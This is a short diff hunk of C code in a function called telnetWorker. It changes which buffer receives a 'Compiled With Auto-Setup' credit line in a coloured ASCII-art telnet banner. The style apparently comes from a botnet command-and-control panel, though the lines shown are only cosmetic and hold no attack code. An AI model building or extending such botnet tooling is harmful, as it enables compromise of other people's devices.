@@ -414,7 +414,7 @@ void *telnetWorker(void *sock) {
 		char ascii_banner_line25 [5000];
 		char ascii_banner_line26 [5000];
 		char line23[80];
-		sprintf(ascii_banner_line26, "                \e[0;97m Compiled With Auto-Setup By '\e[1;35mReload#9575\e[0;97m'\r\n");
+		sprintf(ascii_banner_line19, "                \e[0;97m Compiled With Auto-Setup By '\e[1;35mReload#9575\e[0;97m'\r\n");
         	sprintf(ascii_banner_line20, "                \e[1;35m ██████\e[0;97m╗ \e[1;35m██\e[0;97m╗  \e[1;35m██\e[0;97m╗ \e[1;35m█████\e[0;97m╗ \e[1;35m███\e[0;97m╗   \e[1;35m███\e[0;97m╗\e[1;35m██\e[0;97m╗\r\n");
 		sprintf(ascii_banner_line21, "                \e[1;35m██\e[0;97m╔═══\e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║ \e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m╗\e[1;35m████\e[0;97m╗ \e[1;35m████\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line22, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m█████\e[0;97m╔╝ \e[1;35m███████\e[0;97m║\e[1;35m██\e[0;97m╔\e[1;35m████\e[0;97m╔\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
